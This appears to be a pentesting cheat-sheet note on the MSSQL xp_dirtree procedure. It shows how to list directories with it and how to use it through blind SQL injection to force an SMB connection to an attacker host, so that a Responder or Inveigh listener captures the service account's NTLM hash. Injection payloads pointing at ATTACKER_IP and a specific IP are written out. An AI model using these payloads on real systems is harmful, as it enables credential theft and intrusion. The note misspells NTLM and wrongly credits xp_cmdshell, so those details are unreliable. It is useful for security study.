### XP_Dirtree
This is a pretty standard stored procedure that list file and folders on the disk, from the DB itself.

### How to use?
1)If you want to show the folder structure?
`EXEC master.sys.xp_dirtree 'PATH';`
2)If you want to show all files and sub folders:
`EXEC master.sys.xp_dirtree 'PATH',0,1;`
The first is the path, the second 0=all subfolders, and the third 1=all files as well!


### Example
**NTML HASH Disclosure**
This attack is the easiest that aims to unveil the NTML hash of the account used to run the MSSQL service and successfully crack.
The culprit is to use the stored procedure "XP_CMDSHELL" which is a legit and enabled procedure by default!

#### Attack scenario
You have your Blind Bool based SQLi over `/api/check-username.php?u=maria' SELECT DB_NAME()-- -`

1)Setup a listening Responder/Inveigh(Windows) sniffer
2)Send the query 
```
<EXEC xp_dirtree '\\ATTACKERIP';
OR
<EXEC master.sys.xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;
OR
/api/check-username.php?u=maria';EXEC xp_dirtree '\\10.10.15.105';--
```
(The first is the path, the second 0=all sub folders, and the third 1=all files as well!)
3)Now you are GUCCI! 